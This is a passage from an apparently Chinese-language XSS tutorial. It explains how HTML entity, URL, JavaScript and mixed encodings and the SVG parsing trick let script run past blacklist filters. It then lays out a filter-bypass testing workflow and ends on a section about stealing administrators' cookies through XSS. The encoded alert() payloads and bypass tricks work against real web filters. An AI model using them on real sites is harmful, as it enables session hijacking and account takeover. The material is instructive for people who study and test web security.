<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line">&lt;a href=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 十进制</span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line">// 十六进制</span><br><span class="line">&lt;img src=x onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;</span><br><span class="line"></span><br><span class="line">// 也可以不带分号</span><br><span class="line">&lt;img src=x onerror=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29&gt;</span><br></pre></td></tr></table></figure>

<p>但是要注意，对于HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 <code>&amp;#…</code> 形式解码，转化成对应的解码字符并被放入数据缓冲区中。</p>
<p><strong>（1）数据状态中的字符引用：</strong>数据状态就是解析一个标签内里面的内容，如 <code>&lt;div&gt;...&lt;/div&gt;</code> 中的内容，当浏览器解析完 <code>&lt;div&gt;</code> 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(&quot;xss&quot;)&amp;#62;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>如下图，此时在页面上显示的是经过转义的内容：</p>
<p>[<img src="/../images/20210523094712-cb6a83bc-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094712-cb6a83bc-bb68-1.png)</p>
<p>这看上去是一个标准的标签语言，但并不会触发xss，因为当前HTML解析器处于“数据状态”，不会转换到“标签开始状态”，所以就不会建立新的标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成“数据”而不是XSS攻击向量。</p>
<p><strong>（2）属性值状态中的字符引用：</strong>属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>（3）RCDATA状态中的字符引用：</strong>然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素：</p>
<ol>
<li>空元素(Void elements)，如 <code>&lt;area&gt;</code>、<code>&lt;br&gt;</code>、<code>&lt;base&gt;</code> 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。</li>
<li>原始文本元素(Raw text elements)，有 <code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>。原始文本元素可以容纳文本。</li>
<li>RCDATA元素(RCDATA elements)，有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code>。RCDATA元素可以容纳文本和字符引用。</li>
<li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。</li>
<li>基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。</li>
</ol>
<p>注意到RCDATA元素中有 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(&quot;xss&quot;)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>

<p>[<img src="/../images/20210523094713-cbda5a48-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094713-cbda5a48-bb68-1.png)</p>
<p>但是如果直接放进去标签的内容呢，不带转义字符呢，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>

<p>同样也是不会触发XSS的：</p>
<p><img src="/" alt="img"></p>
<p>这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“&lt;”字符，它会转换到“RCDATA小于号状态”。如果“&lt;”字符后没有紧跟着“&#x2F;”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有 <code>&lt;/textarea&gt;</code> 或者 <code>&lt;/title&gt;</code>，因此，在 <code>&lt;textarea&gt;</code> 和 <code>&lt;title&gt;</code> 的内容中不会创建标签，就不会有脚本能够执行了。</p>
<p>另外还有一点要注意：我们从上面HTML的五类元素中还发现有一个原始文本元素 <code>&lt;script&gt;</code> 在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。浏览器看不懂中间这堆编码是和啥东西，所以也不会被执行，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>[<img src="/../images/20210523094714-cc1f779a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc1f779a-bb68-1.png)</p>
<p>那么如何才能让里面的内容进行转义并执行弹窗呢，这里需要利用到XSS的一个黑魔法——“svg”，我们下文中会提及。</p>
<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;...&quot;&gt;xx&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>下面给出几个实例。</p>
<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>注意，伪协议头 <code>javascript:</code> 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。就比如说 <code>http://www.baidu.com</code> 可以被URL编码为 <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>，但是不能把协议也进URL编码：<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> 。</p>
<p>但是伪协议头 <code>javascript:</code> 可以进行HTML编码。</p>
<h2 id="Javascript-编码"><a href="#Javascript-编码" class="headerlink" title="Javascript 编码"></a>Javascript 编码</h2><p>我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p>
<p>Javascript 中可以识别的编码类型有：</p>
<ul>
<li>Unicode 编码</li>
<li>八进制编码</li>
<li>十六进制编码</li>
</ul>
<p>一般情况下我们使用Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。</p>
<h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h3><ul>
<li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;\u0078\u0073\u0073&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>但要注意，我们同样也不能对伪协议头 <code>javascript:</code> 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。</p>
<h3 id="在DOM环境中的JavaScript编码"><a href="#在DOM环境中的JavaScript编码" class="headerlink" title="在DOM环境中的JavaScript编码"></a>在DOM环境中的JavaScript编码</h3><p>对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，像下面的XSS向量是不能直接执行的：</p>
<ul>
<li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\141\154\145\162\164(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\x61\x6c\x65\x72\x74(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>如下图，插入之后没有任何反应：</p>
<p>[<img src="/../images/20210523094714-cc651728-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cc651728-bb68-1.png)</p>
<p>[<img src="/../images/20210523094714-cca61c3c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094714-cca61c3c-bb68-1.png)</p>
<p>要想让他们能够执行我们要将他们放在DOM环境中，即DOM型的XSS。</p>
<p>测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;...&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>以上情况很多都是出现在你搜索后，显示你所查询的关键字，变量 <code>search</code> 是一个可控点，当我们查询一个XSS攻击向量后，变量 <code>search</code> 就会被赋值为这个XSS向量，从而插入到div标签中触发XSS，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&#x27;s&#x27;&gt;test&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var search = &quot;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;&quot;;</span><br><span class="line">    document.getElementById(&#x27;s&#x27;).innerHTML = search;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>[<img src="/../images/20210523094715-cce8331a-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cce8331a-bb68-1.png)</p>
<p>此时如果过滤了 <code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>&amp;</code>、<code>%</code> 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS向量全部编码，即 <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> 的以下编码都可以弹窗：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Unicode编码</span><br><span class="line">\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E</span><br><span class="line"></span><br><span class="line">// 八进制编码</span><br><span class="line">\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76</span><br><span class="line"></span><br><span class="line">// 十六进制编码</span><br><span class="line">\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e</span><br></pre></td></tr></table></figure>

<p><img src="/" alt="img"></p>
<p>还有一种让八进制和十六进制编码的XSS攻击向量执行的方式便是将XSS向量放在某个能把字符串当做JavaScript代码来执行的函数里，比如eval()、setTimeout()、setInterval()等函数。如下示例：</p>
<ul>
<li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br></pre></td></tr></table></figure>

<p>或者也可以直接将一整段js代码编码后放入eval()函数中执行。</p>
<h2 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h2><p><strong>混合编码就是对一个XSS向量同时进行多种编码，如下示例：</strong></p>
<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 对javascript:进行HTML编码, 对alert(&quot;xss&quot;)进行URL编码</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 对javascript:进行HTML编码, 对alert进行Unicode编码</span><br><span class="line">&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>也可以利用解码顺序进行混合编码，如下示例：</strong></p>
<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
<p>首先对“alert”进行JavaScript Unicode编码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>然后再对 <code>\u0061\u006c\u0065\u0072\u0074</code> 进行URL编码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(&quot;xss&quot;)&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>最后对标签中的 <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> 整体进行HTML编码即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h2 id="SVG：XSS的一个黑魔法"><a href="#SVG：XSS的一个黑魔法" class="headerlink" title="SVG：XSS的一个黑魔法"></a>SVG：XSS的一个黑魔法</h2><p>我们在上文HTML编码那里最后留了一个坑，即HTML的五类元素中，像 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符。</p>
<p>也就是说，向下面这样的代码，浏览器不会对其中的HTML实体字符进行解码，也就不会执行并触发XSS了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>那如何绕过HTML原始文本元素进而执行HTML实体解码呢，这涉及到了 <code>&lt;svg&gt;</code> 的魔力，那是一种特殊的触发效果，单纯script标签内加载html实体编码，只会当做文本，没有任何触发结果，如下图：</p>
<p>[<img src="/../images/20210523094715-cd264a4c-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094715-cd264a4c-bb68-1.png)</p>
<p>但是当在前面加上 <code>&lt;svg&gt;</code> 后，却成功弹窗了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>[<img src="/../images/20210523094716-cd67709e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094716-cd67709e-bb68-1.png)</p>
<p>这是为什么呢？</p>
<p>是因为 <code>&lt;svg&gt;</code> 标签属于HTML五大元素中的外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释，也就是说在解析到<code>&lt;svg&gt;</code> 标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML解析中，实体编码会自动解码成相应的字符，重新来一遍标签开启状态，此时就会执行XSS了。如下图，弹窗后我们查看页面源码。发现原本不能被HTML解码的内容被 <code>&lt;svg&gt;</code> 标签自动解码了：</p>
<p>[<img src="/../images/20210523094717-cde26b1e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-cde26b1e-bb68-1.png)</p>
<h1 id="测试流程思路"><a href="#测试流程思路" class="headerlink" title="测试流程思路"></a>测试流程思路</h1><p>下面让我们来看一下XSS绕过的测试流程。</p>
<p>现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试：</p>
<ol>
<li>暴力测试（输入大量的payload，看返回结果）</li>
<li>根据正则推算</li>
<li>利用浏览器bug</li>
</ol>
<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>（1）尝试插入比较正常的HTML标签，例如：<code>&lt;a&gt;</code>、<code>&lt;b&gt;</code>、<code>&lt;i&gt;</code>、<code>&lt;u&gt;</code> 等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</p>
<p>（2）尝试插入不闭合的标签，例如：<code>&lt;a</code>、<code>&lt;b</code>、<code>i&gt;</code>、<code>u&gt;</code>、<code>&lt;img</code> 等，然后看一下返回响应，是否对开放的标签也有过滤。</p>
<p>（3）然后测试几种常见的XSS向量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1)&lt;/script&gt;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(1);&lt;/scrIPt&gt;</span><br></pre></td></tr></table></figure>

<p>（4）如果过滤器仅仅是把 <code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 标签过滤掉，那么可以用双写的方式来绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>

<p>这样当 <code>&lt;script&gt;</code> 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。</p>
<p>（5）用 <code>&lt;a href</code> 标签来测试，看返回响应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>看看 <code>&lt;a</code> 标签是否被过滤，href 是否被过滤，href里的数据是否被过滤了。如果没有数据被过滤，插入javascript伪协议看看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。</p>
<p>继续测试事件触发执行javascript：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onmouseover=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>看onmouseover事件是否被过滤。</p>
<p>测试一个无效的事件，看看他的过滤规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=x onclimbatree=alert(1)&gt;ClickHere&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>onhashchange 事件在当前 URL 的锚部分(以 ‘#’ 号为开始) 发生改变时触发 。</p>
</blockquote>
<h2 id="测试其他标签和属性"><a href="#测试其他标签和属性" class="headerlink" title="测试其他标签和属性"></a>测试其他标签和属性</h2><p>HTML的标签和属性太多了，上文中已经列出了很多了。</p>
<h1 id="攻击面拓展"><a href="#攻击面拓展" class="headerlink" title="攻击面拓展"></a>攻击面拓展</h1><h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><h3 id="通过-XSS-盗取-Cookie"><a href="#通过-XSS-盗取-Cookie" class="headerlink" title="通过 XSS 盗取 Cookie"></a>通过 XSS 盗取 Cookie</h3><p>Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> ，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。</p>
<p>在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。</p>
<p>这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。</p>
